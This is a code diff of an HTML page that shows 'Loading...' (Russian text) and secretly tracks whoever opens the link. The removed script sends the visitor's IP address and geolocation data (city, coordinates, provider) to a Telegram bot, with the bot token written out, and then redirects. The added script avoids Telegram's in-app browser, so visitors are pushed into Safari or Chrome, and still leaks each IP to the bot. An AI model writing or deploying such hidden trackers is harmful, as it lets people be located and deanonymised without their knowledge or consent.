@@ -5,51 +5,28 @@
     <title>Loading...</title>
 </head>
 <body>
-    <h1>Загрузка...</h1>
+    <h1>Откройте в Safari</h1>
+    <p>Пожалуйста, откройте эту ссылку в браузере Safari или Chrome.</p>
     <script>
-        // Получаем IP через ipify (этот API работает везде)
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(d => d.ip)
-            .then(ip => {
-                // Отправляем IP в Telegram
-                var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-                var chat_id = "8212240529";
-                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
-                return fetch(url).then(() => ip);
-            })
-            .then(ip => {
-                // Теперь отдельно пытаемся получить геоданные (если получится — отправим вторым сообщением)
-                return fetch('https://ipinfo.io/' + ip + '/json')
-                    .then(r => r.json())
-                    .then(geo => {
-                        var text = "Геоданные:\n" +
-                                   "Страна: " + (geo.country || '—') + "\n" +
-                                   "Город: " + (geo.city || '—') + "\n" +
-                                   "Регион: " + (geo.region || '—') + "\n" +
-                                   "Координаты: " + (geo.loc || '—') + "\n" +
-                                   "Провайдер: " + (geo.org || '—');
-                        var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-                        var chat_id = "8212240529";
-                        var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
-                        return fetch(url);
-                    })
-                    .catch(() => {
-                        // Если геоданные не получились — ничего страшного, IP уже отправлен
-                    });
-            })
-            .catch(function() {
-                // Если вообще ошибка
-                var text = "Ошибка определения IP";
-                var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
-                var chat_id = "8212240529";
-                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(text);
-                fetch(url).catch(function() {});
-            });
-
-        setTimeout(function() {
-            window.location.href = "https://example.com";
-        }, 3000);
+        // Проверяем, открыто ли в Telegram
+        if (navigator.userAgent.includes('Telegram')) {
+            document.body.innerHTML = '<h1>⚠️ Откройте в браузере</h1><p>Эта ссылка работает только в Safari или Chrome.</p>';
+        } else {
+            // Если не Telegram — делаем запрос
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    var ip = d.ip;
+                    var token = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
+                    var chat_id = "8212240529";
+                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=IP: " + ip;
+                    return fetch(url);
+                })
+                .catch(() => {});
+            setTimeout(function() {
+                window.location.href = "https://example.com";
+            }, 2000);
+        }
     </script>
 </body>
 </html>
